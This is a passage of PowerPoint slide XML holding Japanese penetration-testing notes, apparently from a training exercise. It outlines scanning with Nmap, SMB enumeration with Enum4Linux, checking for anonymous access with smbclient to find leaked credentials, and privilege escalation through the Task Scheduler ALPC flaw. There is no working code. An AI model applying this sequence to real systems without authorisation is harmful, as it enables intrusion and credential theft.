                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="900" dirty="0"/>
                <a:t>Mail </a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="900" dirty="0"/>
                <a:t>＆</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="900" dirty="0"/>
                <a:t>DNS</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="900" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="四角形: 角を丸くする 89">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4C71DB80-EB9F-1C7D-0D00-23DC4091E733}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7955011" y="778340"/>
            <a:ext cx="1185011" cy="34077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486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D67C64B-CEF8-4B04-B3EA-C786EB54A949}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="515566"/>
            <a:ext cx="10515600" cy="5661397"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1"/>
              <a:t>smb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>あ</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>る→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>Enum4Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>で列挙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>考えられる攻撃方法　</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>設定ミス（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>anonymous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>ログイン可能）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1"/>
              <a:t>Smbclient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t> //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>アドレス</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>ディレクトリ名　で入れるかどうか</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>→そこに認証情報は落ちているかどうか</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>2.smb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>の脆弱性</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>権限昇格の手段</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>Task scheduler(task </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1"/>
              <a:t>scheduling_ALPC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>ワンポイント</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>分からないホストを探す術を書いてみよう。</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>（今回は１対１だからわかるけど本来はわからないよね）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>Echo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>とかで回すやり方とか</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1818260089"/>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2034</TotalTime>
  <Words>1120</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>ワイド画面</PresentationFormat>
  <Paragraphs>165</Paragraphs>
  <Slides>4</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vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="9" baseType="lpstr">
      <vt:lpstr>游ゴシック</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Office Theme</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A1259089</dc:creator>
  <cp:lastModifiedBy>内山３曹</cp:lastModifiedBy>
  <cp:revision>69</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-01T03:52:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-07T07:50:03Z</dcterms:modified>
</cp:coreProperties>
</file>